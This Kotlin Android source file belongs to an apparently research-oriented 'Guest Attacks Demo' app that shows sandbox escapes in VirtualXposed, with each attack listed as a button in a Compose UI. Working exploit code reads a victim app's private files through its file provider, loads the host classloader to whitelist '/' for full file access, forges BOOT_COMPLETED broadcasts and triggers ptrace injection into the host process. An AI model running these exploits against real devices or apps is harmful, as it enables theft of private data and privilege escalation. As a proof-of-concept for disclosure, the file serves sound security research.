package com.virtualxposed.guestattacker

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.expandVertically
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.shrinkVertically
import androidx.compose.foundation.ExperimentalFoundationApi
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.Close
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.core.net.toUri
import com.virtualxposed.guestattacker.StorageBypass.EXPECTED_FILE_RESULTS
import com.virtualxposed.guestattacker.StorageBypass.HOST_APP
import com.virtualxposed.guestattacker.StorageBypass.VICTIM_APP
import com.virtualxposed.guestattacker.StorageBypass.victimFile
import com.virtualxposed.guestattacker.Utils.toast
import com.virtualxposed.guestattacker.ui.theme.AttacksTheme
import com.virtualxposed.guestattacker.ui.theme.Green
import com.virtualxposed.guestattacker.ui.theme.Red
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    companion object {
        init {
            System.loadLibrary("guestattacker")
        }
    }

    @SuppressLint("SdCardPath", "QueryPermissionsNeeded")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        enableEdgeToEdge()
        setContent {
            AttacksTheme {
                DemoScreen(
                    listOf(
                        DemoAction(
                            "Shell bypass",
                            "Read and write victim file information via shell commands. Shell commands can be used to escalate privileges to host",
                            DemoCategory.IO,
                        ) {
                            StorageBypass.shellBypass(this)
                        },
                        // 1. Symlinks can likely also be used to bypass storage problems
                        // 2. Path traversal (..) may also work
                        DemoAction(
                            "File descriptor bypass",
                            "Use file descriptors from proc to read and write victim files",
                            DemoCategory.SharedProcess,
                        ) {
                            StorageBypass.fdBypass(this)
                        },
                        DemoAction(
                            "Permission bypass",
                            "Start phone call without guest app permissions",
                            DemoCategory.MissingHook,
                        ) {
                            MissingHook.startCall(this)
                        },
                        DemoAction(
                            "Kill apps",
                            "Interfere with other apps by killing them. This kills the victim app",
                            DemoCategory.Interference,
                        ) {
                            Interference.killVictim(this@MainActivity)
                        },

                        DemoAction(
                            "ptrace injection",
                            "Use ptrace to read a victim file as the host process. Can be used to perform arbitrary code execution as the host." +
                                    "\nThis demo is only programmed to support x86_64",
                            DemoCategory.SharedProcess,
                        ) {
                            val activityManager =
                                this.getSystemService(ACTIVITY_SERVICE) as ActivityManager

                            val hostApp = activityManager.runningAppProcesses.firstOrNull {
                                it.processName == HOST_APP
                            }
                            if (hostApp == null) {
                                toast(this, "Failed to find host process.")
                                return@DemoAction false
                            }

                            val result =
                                Native.ptraceOpen(hostApp.pid, victimFile.absolutePath, 1000)
                            toast(
                                this,
                                "Private file results: $result",
                            )
                            result == EXPECTED_FILE_RESULTS
                        },

                        DemoAction(
                            "Shared file provider",
                            "This app shares the same underlying context as the victim app. " +
                                    "Therefore this app can use the private file providers from the victim app ",
                            DemoCategory.SharedContext
                        ) {
                            val uri =
                                "content://${VICTIM_APP}.fileprovider/private_files/private-file".toUri()

                            val result = runCatching {
                                contentResolver.openInputStream(uri)?.reader()?.readText()
                            }.getOrNull()

                            if (result == null) {
                                toast(
                                    this,
                                    "Unable to read from the file provider",
                                )
                                return@DemoAction false
                            } else {
                                toast(
                                    this,
                                    "Private file results: $result",
                                )
                                return@DemoAction result == EXPECTED_FILE_RESULTS
                            }
                        },
                        DemoAction(
                            "Backtrace bypass",
                            "Throwables store a private backtrace object which contains class references to all classes in the stacktrace. " +
                                    "This is used to print the stack trace, but it can also be used to get the host classloader. " +
                                    "Using that classloader it's possible to call host functions to whitelist root to read all files. " +
                                    "This invalidates the entire sandbox.",
                            DemoCategory.MissingHook
                        ) {
                            runCatching {
                                val loader = MainApplication.hostClassLoader!!
                                val nativeEngine =
                                    loader.loadClass("com.lody.virtual.client.NativeEngine")
                                val whitelist = nativeEngine.getMethod(
                                    "whitelist",
                                    String::class.java,
                                    Boolean::class.java
                                )
                                // Whitelist / to get full file access
                                whitelist.invoke(null, "/", true)
                                val result = victimFile.readText()
                                toast(
                                    this,
                                    "Private file results: $result",
                                )
                                return@DemoAction result == EXPECTED_FILE_RESULTS
                            }.onFailure {
                                toast(this, "Unexpected failure")
                            }
                            false
                        },
                        DemoAction(
                            "Missing IPC verification",
                            "There are no safeguards against binding to non-exported IPC services. This makes it possible to bind to the private victim service.",
                            DemoCategory.IPC
                        ) {
                            IPC.messageVictimApp(this)
                        }, DemoAction(
                            "Bypass receiver verification",
                            "VirtualXposed registers all receivers as exported static broadcast receivers, with no caller verification. " +
                                    "To prevent malicious broadcasts rewrites intents and redirects them to the real receiver. " +
                                    "However, by manually calling the real receiver it is possible to send arbitrary Intents, including system-exclusive intents such as BOOT_COMPLETED",
                            DemoCategory.IPC
                        ) {
                            val intent = Intent().apply {
                                // Comes from how VirtualApp registers receivers:
                                // componentAction = String.format("_VA_%s_%s", info.packageName, info.name);
                                setAction("_VA_${VICTIM_APP}_$VICTIM_APP.BootReceiver")
                                putExtra("_VA_|_intent_", Intent().apply {
                                    setAction("android.intent.action.BOOT_COMPLETED")
                                })
                                putExtra("_VA_|_user_id_", 0)
                            }
                            try {
                                this.sendBroadcast(intent)
                                return@DemoAction true
                            } catch (_: Throwable) {
                                return@DemoAction false
                            }
                        }
                    )
                )
            }
        }
    }
}

enum class DemoCategory(val categoryName: String) {
    IO("Improper storage isolation"),
    MissingHook("Missing hook abuse"),
    Interference("Cross-app interference"),
    SharedProcess("Shared process abuse"),
    SharedContext("Shared context abuse"),
    IPC("IPC abuse"),
}

data class DemoAction(
    val title: String,
    val description: String,
    val category: DemoCategory,
    val onExecute: suspend () -> Boolean
)

@OptIn(ExperimentalFoundationApi::class, ExperimentalMaterial3Api::class)
@Composable
fun DemoScreen(actions: List<DemoAction>) {
    val groupedActions = remember(actions) {
        actions.groupBy { it.category }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Text(
                        text = "Guest Attacks Demo",
                        style = MaterialTheme.typography.headlineMedium
                    )
                }
            )
        }
    ) { innerPadding ->
        LazyColumn(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .padding(horizontal = 16.dp),
            verticalArrangement = Arrangement.spacedBy(8.dp),
            contentPadding = PaddingValues(bottom = 16.dp)
        ) {
            groupedActions.forEach { (categoryName, categoryActions) ->
                stickyHeader(key = categoryName) {
                    CategoryHeader(title = categoryName.categoryName)
                }

                items(
                    items = categoryActions,
                    key = { "${it.category}_${it.title}" }
                ) { action ->
                    DemoRow(action = action)
                }
            }
        }
    }
}

@Composable
fun CategoryHeader(
    title: String,
    modifier: Modifier = Modifier
) {
    Surface(
        modifier = modifier.fillMaxWidth(),
        color = MaterialTheme.colorScheme.background
    ) {
        Text(
            text = title,
            style = MaterialTheme.typography.titleLarge,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.primary,
            modifier = Modifier.padding(vertical = 12.dp)
        )
    }
}

@Composable
fun DemoRow(action: DemoAction) {
    var executionResult by remember { mutableStateOf<Boolean?>(null) }
    var isExecuting by remember { mutableStateOf(false) }

    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant
        )
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Column(
                    modifier = Modifier
                        .weight(1f)
                        .padding(end = 16.dp),
                    verticalArrangement = Arrangement.spacedBy(4.dp)
                ) {
                    Text(
                        text = action.title,
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )

                    Text(
                        text = action.description,
                        style = MaterialTheme.typography.bodyMedium,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                }

                Button(
                    onClick = {
                        isExecuting = true
                        CoroutineScope(Dispatchers.IO).launch {
                            executionResult = runCatching {
                                action.onExecute()
                            }.onFailure { t ->
                                t.printStackTrace()
                            }.getOrElse {
                                false
                            }
                            isExecuting = false
                        }
                    },
                    enabled = !isExecuting
                ) {
                    Box(contentAlignment = Alignment.Center) {
                        // Cheat to make the button stay consistent in width
                        Text(
                            text = "Execute",
                            modifier = Modifier.alpha(if (isExecuting) 0f else 1f)
                        )
                        if (isExecuting) {
                            CircularProgressIndicator(
                                modifier = Modifier.size(20.dp),
                                color = MaterialTheme.colorScheme.onSurface,
                                strokeWidth = 2.dp
                            )
                        }
                    }
                }
            }

            // Not good solution, but works well enough
            AnimatedVisibility(
                visible = executionResult != null,
                enter = fadeIn() + expandVertically(),
                exit = fadeOut() + shrinkVertically()
            ) {
                executionResult?.let { success ->
                    val statusColor = if (success) Green else Red
                    val icon = if (success) Icons.Default.Check else Icons.Default.Close
                    val message = if (success) "Action Successful" else "Action Failed"

                    Row(
                        modifier = Modifier
                            .padding(top = 12.dp)
                            .fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier
                                .size(24.dp)
                                .background(color = statusColor, shape = CircleShape),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = icon,
                                contentDescription = null,
                                tint = Color.White,
                                modifier = Modifier.size(16.dp)
                            )
                        }

                        Spacer(modifier = Modifier.width(8.dp))

                        Text(
                            text = message,
                            style = MaterialTheme.typography.labelLarge,
                            color = statusColor,
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                }
            }
        }
    }
}